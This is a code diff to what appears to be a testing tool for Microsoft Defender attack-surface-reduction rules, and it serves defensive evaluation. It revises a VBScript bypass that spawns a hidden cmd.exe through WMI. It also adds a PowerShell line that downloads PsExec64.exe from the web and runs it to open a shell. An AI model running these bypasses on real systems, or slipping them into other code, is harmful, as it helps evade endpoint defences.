@@ -197,17 +197,22 @@ asr_rules = {
             {
                 "script": """
                 Sub ASR_bypass_create_child_process_rule5()
-                Const HIDDEN_WINDOW = 0
-                strComputer = "."
-                Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
-                Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
-                Set objConfig = objStartup.SpawnInstance_
-                objConfig.ShowWindow = HIDDEN_WINDOW
-                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
-                objProcess.Create "cmd.exe", Null, objConfig, intProcessID
+                    Const HIDDEN_WINDOW = 0
+                    strComputer = "."
+                    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+                    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                    Set objConfig = objStartup.SpawnInstance_
+                    objConfig.ShowWindow = HIDDEN_WINDOW
+                    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                    objProcess.Create "cmd.exe", Null, objConfig, intProcessID
                 End Sub
                 """
-            }
+            },
+            {
+                "script": """
+                Invoke-WebRequest -Uri "https://live.sysinternals.com/PsExec64.exe" -OutFile "PsExec64.exe"; .\PsExec64.exe -accepteula \\localhost cmd.exe
+                """
+            },
         ]
     },
     "Block untrusted and unsigned processes that run from USB": {
@@ -359,7 +364,7 @@ def determine_file_extension(script):
         return '.vbs'
     elif 'xcopy ' in script:
         return '.bat'
-    elif 'invoke ' in script or 'Start-Process ' in script:
+    elif 'Invoke-WebRequest ' in script or 'Start-Process ' in script:
         return '.ps1'
     else:
         return '.txt'
